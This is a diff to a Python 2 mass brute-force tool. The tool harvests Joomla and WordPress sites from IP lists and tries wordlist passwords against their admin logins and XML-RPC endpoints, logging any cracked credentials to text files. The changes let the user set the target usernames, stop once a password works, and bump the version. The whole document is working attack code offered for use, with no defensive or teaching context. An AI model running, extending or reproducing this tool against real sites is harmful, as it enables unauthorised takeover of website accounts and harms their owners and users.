@@ -163,6 +163,8 @@ parser.add_argument('-wp', '--wordpress', help='Brute force wordpress websites',
 parser.add_argument('-x', '--allwebsites', help='Brute force all', action='store_true')
 parser.add_argument('-sm', '--smart', help='Detect joomla and wordpress scripts', action='store_true')
 parser.add_argument('-hl', '--hidelogo', help='Hide logo', action='store_true')
+parser.add_argument('-wu', '--wordpress-user', help='Set wordpress user', dest='wu')
+parser.add_argument('-ju', '--joomla-user', help='Set joomla user', dest='ju')
 args = parser.parse_args()
 jmlist = []
 wplist = []
@@ -176,12 +178,11 @@ if not args.hidelogo :
   | $$  $$$| $$  /$$$$$$$|  $$$$$$   | $$    | $$$$$$$$| $$  \__/      | $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$
   | $$\  $ | $$ /$$__  $$ \____  $$  | $$ /$$| $$_____/| $$            | $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/
   | $$ \/  | $$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$            | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$
-  |__/     |__/ \_______/|_______/    \___/   \_______/|__/            |_______/ |__/       \______/    \___/   \_______/ v1.1
+  |__/     |__/ \_______/|_______/    \___/   \_______/|__/            |_______/ |__/       \______/    \___/   \_______/ v1.2
 
   """+Colors.ENDC
   # Just for that the text will be in center
   print Colors.CYAN+'Author : MatriX Coder'.rjust(81)+Colors.ENDC
-  print Colors.RED+'medazizknani[at]gmail.com'.rjust(85)+Colors.ENDC
   print
 if argv==1 or not args.wordl :
   print parser.print_help()
@@ -220,16 +221,18 @@ else :
   elif args.fi :
     for ip in file2list(args.fi) :
       if args.joomla :
-        if args.verbose : print '[*] Grabbing Joomla from', ip 
+        if args.verbose : print '[*] Grabbing Joomla from', ip
         jmlist.extend(getJoomla(ip))
-      elif args.wordpress : 
+      elif args.wordpress :
         if args.verbose : print '[*] Grabbing wordpress from', ip
         wplist.extend(getWordpress(ip))
       elif args.allwebsites :
-        if args.verbose : print '[*] Grabbing Joomla from', ip 
+        if args.verbose : print '[*] Grabbing Joomla from', ip
         jmlist.extend(getJoomla(ip))
         if args.verbose : print '[*] Grabbing wordpress from', ip
         wplist.extend(getWordpress(ip))
+  wusr = 'admin' if not args.wu else args.wu
+  jusr = 'admin' if not args.ju else args.ju
   #~ if not args.timeout : thetimeout  = 10
   #~ elif args.timeout : thetimeout = args.timeout
   #~ print thetimeout
@@ -246,23 +249,25 @@ else :
         jm = Jmbrute(site)
         token = jm.getToken()
         if token :
-          jm.trylogin('admin', passwd, token)
-          if args.verbose : print '[*] Trying '+site+':admin:'+passwd
+          jm.trylogin(jusr, passwd, token)
+          if args.verbose : print '[*] Trying '+site+':'+jusr+':'+passwd
           if jm.checklog() :
-            print Colors.GREEN+'[*] Cracked', site, 'user : admin', 'pass :', passwd+Colors.ENDC
-            logger(site, 'admin', passwd, 'joomla.txt')
+            print Colors.GREEN+'[*] Cracked', site, 'user : '+jusr, 'pass :', passwd+Colors.ENDC
+            logger(site, jusr, passwd, 'joomla.txt')
+            break
 
   if wplist :
     print '[+] Brute forcing', len(wplist), 'wordpress sites'
     for site in wplist :
       for passwd in passlist :
         wp = WPxmlrpc(site)
-        resp = wp.sendPost('admin', passwd)
+        resp = wp.sendPost(wusr, passwd)
         #print resp
-        if args.verbose : print '[*] Trying '+site+':admin:'+passwd
+        if args.verbose : print '[*] Trying '+site+':'+wusr+':'+passwd
         if resp :
           if wp.checklog(resp) :
-            print Colors.GREEN+'[*] Cracked', site, 'user : admin', 'pass :', passwd+Colors.ENDC
-            logger(site, 'admin', passwd, 'wordpress.txt')
+            print Colors.GREEN+'[*] Cracked', site, 'user : '+wusr, 'pass :', passwd+Colors.ENDC
+            logger(site, wusr, passwd, 'wordpress.txt')
+            break
 
 #EOF
